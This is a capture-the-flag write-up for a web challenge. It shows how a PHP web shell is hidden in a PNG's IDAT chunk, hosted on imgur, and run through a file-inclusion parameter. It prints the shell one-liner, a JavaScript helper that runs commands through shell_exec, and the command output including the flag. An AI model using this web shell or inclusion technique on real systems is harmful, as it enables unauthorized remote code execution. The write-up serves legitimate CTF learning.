# imgur (50pts, 49 solved) Web [Medium]

## First look
When we open the website, we need to create an account or login. After doing that, we can view our profile and modify our profile picture with a picture from imgur only.

## Solving
Since `imgur` removes all `exif` data, we need to actually inject it into the bytes (`IDAT` section). Luckily, someone else has already done that for us: `https://github.com/huntergregal/PNG-IDAT-Payload-Generator`, which had this article: `https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/`. Now we can upload the picture to `Imgur`: `https://i.imgur.com/FLbtxhg.png`.  
When we try to upload this to the application, it denies it (`invalid path, only a-z0-9A-Z are allowed`). After a bit of trial and error, we find that it only accepts `jpg` images. I tried to simply change the extension to `jpg` and we got lucky final url:
```
/index.php?page=profile&setpicture=https://i.imgur.com/FLbtxhg.jpg
```
And we can verify that it actually contains our code, by downloading it and opening it up in an editor.  
From our article, we saw this code: `<?=$_GET[0]($_POST[1]);?>`. So we need to post and use a query:
```js
function executeCommand(command) {
    return new Promise(async resolve => {
        let response = await fetch("/?0=shell_exec&page=profiles%2fFLbtxhg.jpg", {
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "1=" + encodeURIComponent(command),
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
                // 'Content-Type': 'application/x-www-form-urlencoded',
            },
            "method": "POST",
            "mode": "cors",
            "credentials": "include"
        });
        let text = await response.text();
        //console.log(text);
        resolve(text);
    });
}

(async function() {
    let response = await executeCommand("ls -la /");
    console.log(response);
    /*
    total 84
    drwxr-xr-x   1 root root 4096 Nov 20 14:11 .
    drwxr-xr-x   1 root root 4096 Nov 20 14:11 ..
    -rwxr-xr-x   1 root root    0 Nov 20 14:11 .dockerenv
    drwxr-xr-x   1 root root 4096 Feb  1  2020 bin
    drwxr-xr-x   2 root root 4096 Nov 10  2019 boot
    drwxr-xr-x   5 root root  360 Nov 20 14:11 dev
    drwxr-xr-x   1 root root 4096 Nov 20 14:11 etc
    -rw-r--r--   1 root root   70 Mar 21  2020 flag_3d05c1f377122d0af8a3426cd2c9a739
    drwxr-xr-x   1 root root 4096 Sep 21 09:07 home
    drwxr-xr-x   1 root root 4096 Feb  1  2020 lib
    drwxr-xr-x   2 root root 4096 Jan 30  2020 lib64
    drwxr-xr-x   2 root root 4096 Jan 30  2020 media
    drwxr-xr-x   2 root root 4096 Jan 30  2020 mnt
    drwxr-xr-x   2 root root 4096 Jan 30  2020 opt
    dr-xr-xr-x 193 root root    0 Nov 20 14:11 proc
    drwx------   1 root root 4096 Feb 21  2020 root
    drwxr-xr-x   1 root root 4096 Nov 20 14:11 run
    drwxr-xr-x   1 root root 4096 Feb  1  2020 sbin
    drwxr-xr-x   2 root root 4096 Jan 30  2020 srv
    dr-xr-xr-x  12 root root    0 Nov 20 18:12 sys
    drwxrwxrwt   1 root root 4096 Nov 20 16:55 tmp
    drwxr-xr-x   1 root root 4096 Jan 30  2020 usr
    drwxr-xr-x   1 root root 4096 Feb  1  2020 var
    */
    response = await executeCommand("cat /flag_3d05c1f377122d0af8a3426cd2c9a739");
    console.log(response);
    /*
    DCTF{00520d68be7231d130b6acd3fe721098e93fa074b05b94841f90eed41168643d}
    */
})();
```
Which gets us the flag: `DCTF{00520d68be7231d130b6acd3fe721098e93fa074b05b94841f90eed41168643d}`